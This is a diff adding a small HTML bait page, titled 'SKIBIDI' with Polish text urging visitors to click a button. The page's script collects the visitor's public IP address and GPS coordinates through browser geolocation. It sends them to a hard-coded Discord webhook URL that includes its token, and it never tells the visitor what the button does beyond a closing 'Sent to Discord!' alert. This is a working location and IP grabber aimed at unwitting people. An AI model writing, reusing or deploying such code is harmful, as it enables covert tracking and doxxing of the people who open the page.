@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SKIBIDI</title>
+  <script>
+    async function getLocation() {
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      const ip = ipData.ip;
+
+      const geoResponse = await new Promise((resolve, reject) => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            position => {
+              resolve({
+                lat: position.coords.latitude,
+                lng: position.coords.longitude
+              });
+            },
+            error => {
+              reject("Geolocation error: " + error.message);
+            }
+          );
+        } else {
+          reject("Geolocation not supported by this browser.");
+        }
+      });
+
+      return { ip, ...geoResponse };
+    }
+
+    async function sendToDiscord() {
+      const data = await getLocation();
+
+      const webhookUrl = 'https://discord.com/api/webhooks/1531086043514933338/0hdVmOPFLwK04cvq__sHGUsafqlhF5YK7IA6x7qKdraK4FzbossJD3PehorY3qnORELz'; 
+
+      const payload = {
+        content: `IP Address: ${data.ip}\nGPS Coordinates: ${data.lat}, ${data.lng}`
+      };
+
+      await fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      });
+
+      alert("Sent to Discord!");
+    }
+  </script>
+</head>
+<body>
+  <h1>KLIKNIJ PRZYCISK PONIŻEJ</h1>
+  <button onclick="sendToDiscord()">KLIKNIJ TO PROSZE</button>
+</body>
+</html>
